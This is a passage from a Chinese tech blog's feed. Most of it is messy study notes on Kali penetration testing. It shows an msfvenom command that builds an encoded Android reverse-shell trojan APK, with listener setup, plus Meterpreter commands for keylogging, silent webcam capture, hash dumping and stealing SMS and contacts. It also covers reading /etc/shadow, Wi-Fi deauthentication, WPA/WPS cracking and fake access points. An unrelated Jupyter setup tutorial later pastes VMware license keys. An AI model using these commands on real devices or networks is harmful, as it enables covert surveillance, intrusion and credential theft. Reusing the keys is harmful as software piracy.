id="8-2-2-木马基本功能"><a href="#8-2-2-木马基本功能" class="headerlink" title="8.2.2 木马基本功能"></a>8.2.2 木马基本功能</h4><p>当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作：</p><ul><li>sysinfo：获取到对方设备的系统信息</li><li>shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备</li><li>background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话</li><li>run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。</li><li>注入进程</li></ul><ol><li>得到要注入的pid进程：ls</li><li>migrate XXX（pid）注入</li></ol><h3 id="8-2-3-文件管理功能"><a href="#8-2-3-文件管理功能" class="headerlink" title="8.2.3 文件管理功能"></a>8.2.3 文件管理功能</h3><ul><li>download      下载文件</li><li>edit      编辑文件</li><li>cat       查看文件</li><li>mkdir     创建文件夹</li><li>mv        移动文件</li><li>rm        删除文件</li><li>upload        上传文件</li><li>rmdir     删除文件夹</li></ul><h3 id="8-2-4-网络及系统操作"><a href="#8-2-4-网络及系统操作" class="headerlink" title="8.2.4 网络及系统操作"></a>8.2.4 网络及系统操作</h3><p>网络操作：</p><ul><li>arp       看arp缓冲表</li><li>ifconfig      ip地址网卡</li><li>getproxy      获取代理</li><li>netstat       查看端口链接</li></ul><p>系统操作：</p><ul><li>kill      杀进程</li><li>ps        查看进程表</li><li>reboot    重启电脑</li><li>reg       修改注册表</li><li>shell     获取终端</li><li>shutdown  关闭电脑</li><li>sysinfo   获取系统信息</li></ul><h3 id="8-2-5-用户操作和其他功能"><a href="#8-2-5-用户操作和其他功能" class="headerlink" title="8.2.5 用户操作和其他功能"></a>8.2.5 用户操作和其他功能</h3><ul><li>enumdesktops      窗体</li><li>keyscan_dump      键盘记录—下载</li><li>keyscan_start     键盘记录—开始</li><li>keyscan_stop      键盘记录—停止</li><li>uictl             获取键盘鼠标控制权</li><li>record_mic        声音和音频录制</li><li>webscan_chat      查看摄像头接口</li><li>webscan_list      查看摄像头列表</li><li>webscan_stream          查看摄像头获取（偷窥）</li><li>getsystem     获取管理员权限</li><li>hashdump      下载hash</li><li></li></ul><h2 id="九、安卓渗透"><a href="#九、安卓渗透" class="headerlink" title="九、安卓渗透"></a>九、安卓渗透</h2><h3 id="9-1-实现过程"><a href="#9-1-实现过程" class="headerlink" title="9.1 实现过程"></a>9.1 实现过程</h3><ul><li>9.1 在终端根据自己的ip生成安卓木马<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f apk &gt; test.APK</span><br></pre></td></tr></table></figure></li></ul><p>生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。</p><ul><li><p>9.2 启动Metasplooit</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure></li><li><p>9.3 使用handler</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure></li><li><p>9.4 设置安卓木马</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">android</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure></li><li><p>9.5 查看参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></li><li><p>9.6 设置参数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST <span class="comment">192.168.31.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">HPORT 55555</span></span><br></pre></td></tr></table></figure></li><li><p>9.7 启动监听</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="9-2-常见操作"><a href="#9-2-常见操作" class="headerlink" title="9.2 常见操作"></a>9.2 常见操作</h3><ul><li>search        搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！</li><li>download      下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………）</li><li>webcam_stream        开启手机摄像头</li><li>webcam_snap       启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的）</li><li>check_root    检查ROOT</li><li>dump_calllog  下载电话记录</li><li>dump_contracts    下载短信记录</li><li>geolocat  gps定位</li></ul><h2 id="十、Fluxion"><a href="#十、Fluxion" class="headerlink" title="十、Fluxion"></a>十、Fluxion</h2><h3 id="10-1-Fluxion下载"><a href="#10-1-Fluxion下载" class="headerlink" title="10.1 Fluxion下载"></a>10.1 Fluxion下载</h3><p>下载fluxion源码并进入fluxion且运行：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/FluxionNetwork/fluxion.git  </span><br><span class="line"><span class="keyword">cd</span> fluxion</span><br><span class="line">./fluxion.<span class="keyword">sh</span></span><br><span class="line">若提示没下载fluxion.<span class="keyword">sh</span>，则按照要求下载就行</span><br></pre></td></tr></table></figure></p><h2 id="十一、密码破解"><a href="#十一、密码破解" class="headerlink" title="十一、密码破解"></a>十一、密码破解</h2><ul><li><p>查看kali本机的密码字典</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">locate wordlist</span></span><br></pre></td></tr></table></figure></li><li><p>查看某个密码文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure></li><li><p>拷贝/etc/shadow密码文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/etc/</span>shadow<span class="regexp">/ /</span>root<span class="regexp">/Desktop/</span>hash.list</span><br></pre></td></tr></table></figure></li><li><p>more /etc/login.defs</p></li></ul><h2 id="十二、Hydra"><a href="#十二、Hydra" class="headerlink" title="十二、Hydra"></a>十二、Hydra</h2><p>1</p><h2 id="十三、无线破解"><a href="#十三、无线破解" class="headerlink" title="十三、无线破解"></a>十三、无线破解</h2><p>首先做的三步：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng<span class="built_in"> check </span>kill</span><br><span class="line">aiarmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng statr wlan0</span><br></pre></td></tr></table></figure></p><p>监听所有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>监听指定bssid：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon <span class="comment">--bssid XXXX -c 频道 -w wpa(保存名)</span></span><br></pre></td></tr></table></figure></p><p>将连接打掉：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[mac地址]</span> -c <span class="string">[客户端mac地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon <span class="meta">down</span></span><br><span class="line">ifconfig wlan0mon <span class="meta">up</span></span><br></pre></td></tr></table></figure><p>破解：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典]</span> /root/XXX.cap</span><br></pre></td></tr></table></figure></p><p>kali自带常用字典目录：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/john/</span>password.lst</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/wfuzz/</span>wordlist<span class="regexp">/</span></span><br></pre></td></tr></table></figure></p><p>查看字典文件是否含有该密码：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">grep</span> <span class="selector-tag">Password</span> <span class="selector-tag">password</span><span class="selector-class">.lst</span></span><br></pre></td></tr></table></figure></p><p>查看字典有多少行：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [字典] <span class="string">| wc -l</span></span><br></pre></td></tr></table></figure></p><p>解压文件：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></p><hr><p>发现支持wps的AP<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wash -<span class="selector-tag">i</span> wlan0mon</span><br><span class="line">或者是</span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p><p>爆破pin码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -<span class="selector-tag">i</span> wlan0mon -<span class="selector-tag">b</span> [ap mac] -vv -c [信道]</span><br></pre></td></tr></table></figure></p><hr><p>wifite</p><hr><p>伪造wifi：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a <span class="string">[ap_mac]</span> -c <span class="string">[信道]</span> --essid <span class="string">[wifi名字]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><p>```<br>echo [ap(wifi名)] &gt;essid.txt<br>airolib-ng essid_db —import essid essid.txt<br>airolib-ng essid_db —stats<br>airolib-ng essid_db —import password ./names.txt<br>airolib-ng essid_db —batch<br>aircrack-ng -r essid_fb /root/wpa-01.cap</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、换源并安装open-vm-tools&quot;&gt;&lt;a href=&quot;#一、换源并安装open
      
    
    </summary>
    
      <category term="白帽子" scheme="muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
  </entry>
  
  <entry>
    <title>本站须知</title>
    <link href="muzimz.cn/2018/09/26/%E6%9C%AC%E7%AB%99%E9%A1%BB%E7%9F%A5/"/>
    <id>muzimz.cn/2018/09/26/本站须知/</id>
    <published>2018-09-26T11:43:52.000Z</published>
    <updated>2018-12-29T12:34:48.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅前建议"><a href="#阅前建议" class="headerlink" title="阅前建议"></a>阅前建议</h1><p>本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。</p><h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。</p><h1 id="博主希望"><a href="#博主希望" class="headerlink" title="博主希望"></a>博主希望</h1><p>本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。</p><p>本站转载文章会在醒目处留有说明，如有侵权还请联系。</p><p>如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要那个啥的，谢谢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;阅前建议&quot;&gt;&lt;a href=&quot;#阅前建议&quot; class=&quot;headerlink&quot; title=&quot;阅前建议&quot;&gt;&lt;/a&gt;阅前建议&lt;/h1&gt;&lt;p&gt;本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Xshell远程连接linux并远程访问Jupyter notebook服务（机器学习环境的搭建）</title>
    <link href="muzimz.cn/2018/09/23/Xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E5%B9%B6%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEipython%E6%9C%8D%E5%8A%A1/"/>
    <id>muzimz.cn/2018/09/23/Xshell远程连接linux并远程访问ipython服务/</id>
    <published>2018-09-22T17:24:30.000Z</published>
    <updated>2018-12-14T13:11:02.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如今，机器学习、人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的更新，不被时代所淘汰、out、出局，博主也想打算开始深度学习。而据说如今机器学习最好的环境是Python + Jupyter notebook + Tensorflow了，为此首先需要搭建一个这么个环境，以便开始深度学习之旅。此外，若能搭建一个自己的深度学习服务器再好不过了，所以本文将从以下三个部分的内容进行介绍：</p><ul><li>环境准备</li><li>Xshell远程连接Ubuntu</li><li>Jupyter notebook服务器的配置及远程访问</li><li>远程环境的测试</li></ul><p>OK，话不多说，开始进入正轨吧。(#`O′)</p><p><img src="https://ws3.sinaimg.cn/bmiddle/9150e4e5gy1fxklkcjfp8j20c80c80sx.jpg" width="200"></p><hr><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul><li>准备两台计算机，一个作为服务端，一个作为客户端。</li><li>服务端：Linux系统（<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu</a>）<br><a href="https://baike.baidu.com/item/ubuntu/155795?fr=aladdin" target="_blank" rel="noopener">官方介绍</a>：Ubuntu（友帮拓、优般图、乌班图）是一个以桌面应用为主的开源GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的。<br>Linux系统区别于windows系统最大的区别是其主要是利用终端 Shell 命令来进行一系列的操作，所以在实际使用过程中常常用来搭建服务器，该系统搭建在VMware虚拟机中。</li><li>客户端：Windows10系统<br>这个大家再熟悉不过了，就不介绍了。</li><li><a href="https://www.anaconda.com/download/" target="_blank" rel="noopener">Anaconda</a><br><a href="https://baike.baidu.com/item/anaconda/20407441?fr=aladdin" target="_blank" rel="noopener">官方介绍</a>：Anaconda指的是一个开源的Python发行版本，其包含了conda、Python等180多个科学包及其依赖项。<br>所以说，当我们下载了Anaconda之后就不必要再下载Python其他包了，其内部集成了大量大Python工具，其中就包括我们这篇文章的主角Jupyter notebook。</li><li><a href="https://xshell.en.softonic.com/?ex=BB-682.0" target="_blank" rel="noopener">Xshell</a><br>这个就没什么好说的了，它主要是一种远程连接的工具，使用它之后我们就可以通过ssh协议来远程连接Ubuntu系统了，而且它常常与远程文件传输工具Xftp配套使用。</li></ul><h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><p>这里给大家两种方式进行下载，一个是官网下载，一个是鄙人的网盘下载，大家根据自己的方便下载即可。</p><p>官网：</p><ul><li>Anaconda：<a href="https://www.anaconda.com/download" target="_blank" rel="noopener">https://www.anaconda.com/download/</a>，于服务端下载</li><li>Xshell：<a href="https://xshell.en.softonic.com/?ex=BB-682.0" target="_blank" rel="noopener">https://xshell.en.softonic.com/?ex=BB-682.0</a>，于客户端下载</li><li>Ubuntu：<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a>，于服务端下载</li><li>VMware：<a href="https://www.vmware.com/" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a>，于服务端下载</li></ul><p>网盘：</p><ul><li>Anaconda：<a href="https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ</a>， 密码：<code>1pbs</code>，于服务端下载</li><li>Xshell：<a href="https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw" target="_blank" rel="noopener">https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw</a>， 密码：<code>fi0y</code>，于客户端下载</li><li>Ubuntu：<a href="https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ</a>， 密码：<code>50yw</code>，于服务端下载</li><li>VMware：<a href="https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww" target="_blank" rel="noopener">https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww</a>， 密码：<code>hjnq</code>，于服务端下载</li></ul><h3 id="VMware下安装Ubuntu"><a href="#VMware下安装Ubuntu" class="headerlink" title="VMware下安装Ubuntu"></a>VMware下安装Ubuntu</h3><font color="red">注意：以下内容都是在服务端计算机中进行配置</font><p>在VMware虚拟机下安装Ubuntu系统虽然有点步骤，但是并不复杂。在综合考虑到时间成本与其给大家带来的价值的关系下，博主就用文字描述了，暂时不贴图了。但是你不必担心，关键步骤还是会贴图说明的 ( ﹁ ﹁ ) ~→。</p><ul><li><p>在服务端下载好VMware及Ubuntu之后。首先打开VMware你会发现他会让你输入VMware秘钥，以下将给出几个目前有效的秘钥，当你使用的时候也许已经失效了，你可以自行百度查找秘钥：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FF31K-AHZD1-H8ETZ<span class="number">-8</span>WWEZ-WUUVA</span><br><span class="line">CV7T2<span class="number">-6</span>WY5Q<span class="number">-48</span>EWP-ZXY7X-QGUWD</span><br><span class="line">ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</span><br><span class="line">ZC5XK-A6E0M<span class="number">-080</span>XQ<span class="number">-04</span>ZZG-YF08D</span><br><span class="line">ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</span><br></pre></td></tr></table></figure></li><li><p>输入秘钥之后 ，进入到了VMware的页面了，为了缩短文章的字数，博主还是使用windows自带的mspaint来绘制一个流程图来为大家介绍下Ubuntu的安装吧，尽量简洁明了：<br><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/c995d143ad4bd11352793d7557afa40f4afb05c4.jpg" width="600"></p></li></ul><p>原本以为制作这个流程图用不了多少时间，结果却用了20分钟，但是如此一来思路清晰、逻辑性强，值了（好吧，不吹自己了，还有很大的提升空间），w(ﾟДﾟ)w。好了，至此Ubuntu就已经安装好了，如果有卡壳的地方可在文章末留言或者左侧的Gitalk留言。</p><h3 id="Ubuntu下Anaconda的安装"><a href="#Ubuntu下Anaconda的安装" class="headerlink" title="Ubuntu下Anaconda的安装"></a>Ubuntu下Anaconda的安装</h3><p>在VMware下安装好Ubuntu后，虽然Ubuntu内自带了Python，但是其版本是2.7的，而且许多常用的包并没用集成，所以我们还需要安装Anaconda。</p><p>根据以上Anaconda的下载方式下载Anaconda，进入到其目录之下（或者<code>cd</code>操作），然后打开终端，执行如下命令进行安装：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bash</span> <span class="selector-tag">Anaconda3-5</span><span class="selector-class">.3</span><span class="selector-class">.1-Linux-x86_64</span><span class="selector-class">.sh</span>    # 不要盲目的复制粘贴，根据自己所下载的<span class="selector-tag">Anaconda</span>版本执行</span><br></pre></td></tr></table></figure></p><p>执行之后会有一些列诸如同意协议之类的问题，我们默认即可（直接Enter，或者yes），直到出现Anaconda环境变量配置的显示，我们需要选择将其加入到环境变量中去。<br>一系列操作之后，我们关闭终端然后在重新打开终端，然后在终端分别执行<code>conda list</code>、<code>python</code>命令，如果你的终端界面出现类似以下输出，则恭喜你说明你已经完成了anaconda的安装。<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/37d3d539b6003af3aa185627382ac65c1138b6d3.jpg" width="600"></p><p>而如果你的终端输错报错（未找到<code>conda</code>命令之类的）或者Python版本为2.7，那就说明你以上操作中未将Anaconda加入到环境变量，所以你需要手动配置Anaconda的环境变量，操作如下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 打开环境变量的配置文件，从这里我们就可以看出Linux和Windows下的操作的区别了</span></span><br><span class="line"><span class="meta"># windows一般是通过界面的形式进行设置，而Linux下则大多数通过终端并使用vim进行配置</span></span><br><span class="line">sudo vim gedit /root/.bashrc</span><br></pre></td></tr></table></figure></p><p>打开文件之后我们需要在文件末尾添加如下内容<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"XXX:<span class="variable">$PATH</span>"</span>   # XXX为你的Anaconda的bin目录，例如我的是/home/lxj/anaconda3/bin</span><br></pre></td></tr></table></figure></p><p>然后保存，在终端输入source ~/.bashrc进行更新即可完成Anaconda环境变量的配置，不出意外的话再次分别执行<code>Python</code>、<code>conda list</code>命令之后你会看见正确的输出了。</p><blockquote><p>补充：这里需要说明一下，以上的操作是使用Vim进行文件编辑的，他不同于windows下的记事本等，而是通过特定的操作来对文件进行编辑。对于熟悉Vim操作的应该会理解以上Anaconda环境变量的配置，然而如果是对Vim比较陌生的朋友可能会卡壳，所以在这里简单介绍一些vim的操作。</p><blockquote><p>在终端使用vim命令之后将会进入到vim的界面，此时的界面是不允许modify任何内容的，只允许read only。此时我们输入i将会进入到vim的编辑模式，现在就能对该文件进行修改了。<br>文件内容修改完成之后，我们需要退出该vim编辑模式，vim 的退出常用的有以下几种（首先输入Esc键）：</p><ol><li>q! -&gt; 不保存文件修改并退出</li><li>wq -&gt; 保存文件的修改并退出</li><li>wq! -&gt; 有时候我们需要root权限才能编辑文件，使用该命令之后就能够强制修改并退出<br>对于以上Anaconda环境变量的配置，vim的熟悉至此就足够了，但是顺便介绍一下其他常用的命令供大家参考，也是记录一下方便以后的回顾：</li><li>dd -&gt; 剪切当行内容</li><li>Ctrl+b -&gt; 内容向前移动一页</li><li>ctrl+f -&gt; 内容向后移动爷爷</li><li>shift+g -&gt; 鼠标指针定位到最后<br>常用的就是以上一些了，其他的操作有需要的话在来看看。</li></ol></blockquote></blockquote><font color="red">注意：以上内容都是在服务端计算机中进行配置</font><p>好了，好了，好了。至此，我们已经完成了环境的搭建，接下来我们将介绍如何使用Xshell远程连接Ubuntu操作，拿好你的小板凳快快做好。</p><p><img src="https://ss0.baidu.com/73x1bjeh1BF3odCf/it/u=1767287260,2111886590&fm=85&s=CA03E00315D37DE986D8C5700300D073"></p><hr><h2 id="二、Xshell远程连接Ubuntu"><a href="#二、Xshell远程连接Ubuntu" class="headerlink" title="二、Xshell远程连接Ubuntu"></a>二、Xshell远程连接Ubuntu</h2><font color="red">注意：以下内容都是在客户端计算机中进行配置</font><p>安装好Anaconda之后，我们需要通过Xshell使用Xshell来远程连接我们的Ubuntu系统，此时我们的目标需要转移至客户端了。<br>首先在以上软件下载中根据链接下载Xshell，之后Windows傻瓜式安装好Xshell（顺便把Xftp安装下，与Xshell配套使用的，虽然在本文中使用不到）。之后的操作会有几个坑，但是不必担心，博主会带你一个一个的填掉 o(*≧▽≦)ツ┏━┓。</p><p>坑一：连接失败<br>我们双击打开Xshell，并点击<code>文件</code>并新建，然后根据如下图进行操作：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/7dd98d1001e9390191a0077976ec54e737d196d3.jpg" width="600"> </p><blockquote><p>补充，上方中的主机属性是填Ubuntu的ip地址，该地址可在Ubuntu的终端执行ifconfig（windows是ipconfig）命令得到。</p></blockquote><p>以上信息填写完之后在出现的界面输入自己Ubuntu下的用户登录密码即可。<br>执行之后你花发现连接失败，此时需要检查一下Ubuntu是否与客户端处于同一网段下，可以将Ubuntu设置成桥接模式（右键Ubuntu虚拟机然后进行设置），之后再次检查一下客户端（Windows10）是否能够ping通服务端（Ubuntu），在客户端的cmd中执行如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ping</span> <span class="selector-tag">XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span>    # <span class="selector-tag">XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span>为服务端的<span class="selector-tag">ip</span></span><br></pre></td></tr></table></figure></p><p>在以上操作之后，一般就能ping通了，如果失败了则在Ubuntu终端下执行<code>sudo wfw disable</code>命令关闭防火墙。</p><p>坑二：连接失败 (ノへ￣、)</p><p>在如上操作之后，我们再次尝试重新连接。我们可以发现依然连接失败，显示拒绝连接之类的信息。这是因为Xshell是通过ssh协议来连接Ubuntu的，但是Ubuntu默认是没有开启ssh服务的，所以我们需要在其终端执行如下命令来开启ssh服务：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>ssh restart</span><br></pre></td></tr></table></figure></p><p>之后我们再次尝试连接。</p><p>坑三：连接失败 (ノへ￣、) (ノへ￣、)</p><p>一般来讲，这个时候依然是连接失败，此时我们需要安装在Ubuntu下安装ssh服务，执行以下命令进行安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install openssh-server</span><br></pre></td></tr></table></figure></p><p>待其安装好后，我们再再再次连接Ubunut。</p><p>OK，以上坑踩过之后也该连接成功了吧。的确此时你将成功连接到Ubuntu了，之后Xshell将打开一个终端，这个终端就是Ubuntu下的终端了，也就是说我们可以使用该终端控制Ubuntu了，并对其进行Shell操作。ヽ(✿ﾟ▽ﾟ)ノ<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1598723784,1130004174&fm=11&gp=0.jpg" width="200"></p><hr><h2 id="三、Jupyter-notebook服务器的配置及远程访问"><a href="#三、Jupyter-notebook服务器的配置及远程访问" class="headerlink" title="三、Jupyter notebook服务器的配置及远程访问"></a>三、Jupyter notebook服务器的配置及远程访问</h2><p>由于我们在之前已经安装过了Anaconda，所以此时的Ubuntu就已经集成了<code>ipython</code> as well as （秀一下英语，虽然很烂）<code>jupyter-notebook</code>，对此，将通过Xshell远程连接Ubuntu来搭建Jupyter notebook的服务器，并对其进行远程访问。</p><ul><li>在终端中启动ipython或者python，然后执行以下命令<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from IPython<span class="selector-class">.lib</span> import passwd</span><br><span class="line"><span class="function"><span class="title">passwd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></li></ul><p>上述命令执行之后将会在终端显示设置密码，比如在这我们将密码设置成：123，之后enter并确认即可。</p><font color="red">注意：这里的密码是暗文的形式，输入之后不会显示的，还有此时你输入的密码需要记住，因为我们待会远程访问jupyter notebook服务器的时候需要用到该密码进行登录</font><p>密码输入之后，我们将会看到有一个较长字符串，该字符串是上述密码的加密形式，我们需要将其复制下来，在之后的ipython_notebook_config.py文件的设置中需要使用，操作结果如下图所示：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9825bc315c6034a88e4032c6c6134954082376d3.jpg" width="600"></p><ul><li>随后为了方便上述加密密码字符串的记录，我们在此开启另一个终端（这也是Xshell的方便所在），然后使用如下命令创建一个服务器名，比如，在此我们将该名字设置为：XXX<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython<span class="built_in"> profile </span>create 